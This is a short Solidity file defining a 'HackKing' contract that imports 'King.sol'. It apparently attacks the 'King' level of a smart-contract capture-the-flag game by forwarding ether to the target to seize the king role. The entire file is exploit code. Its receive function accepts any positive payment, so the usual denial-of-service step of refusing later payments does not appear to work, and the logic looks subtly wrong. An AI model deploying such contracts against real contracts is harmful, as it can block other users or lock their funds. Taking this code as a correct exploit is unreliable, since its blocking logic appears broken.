// SPDX-License-Identifier: MIT
pragma solidity ^0.6.4;
import './King.sol';

contract HackKing {
    constructor() public payable {}

    receive() external payable {
        require(msg.value > uint256(0), 'not enought funds');
    }

    function becomeKing(address _king) public payable {
        address(_king).call{value: msg.value}("");
    }
}
